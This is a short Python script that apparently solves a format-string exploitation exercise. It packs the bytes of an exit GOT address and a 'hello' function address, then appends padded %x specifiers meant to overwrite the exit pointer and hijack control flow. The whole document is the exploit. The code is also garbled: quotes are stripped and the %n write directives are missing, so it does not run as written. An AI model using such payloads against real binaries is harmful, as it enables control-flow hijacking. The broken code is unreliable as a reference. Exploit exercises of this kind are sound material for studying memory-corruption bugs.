import struct

exit1 = struct.pack(I,0x08049724)
exit2 = struct.pack(I,0x08049724+1)
exit3 = struct.pack(I,0x08049724+2)
exit4 = struct.pack(I,0x08049724+3)
hello = struct.pack(I, 0x080484b4)

exploit=
exploit+=exit1+exit2+exit3+exit4
exploit+=%164x+%4
exploit+=%208x+%5
exploit+=%128x+%6
exploit+=%260x+%7

print exploit
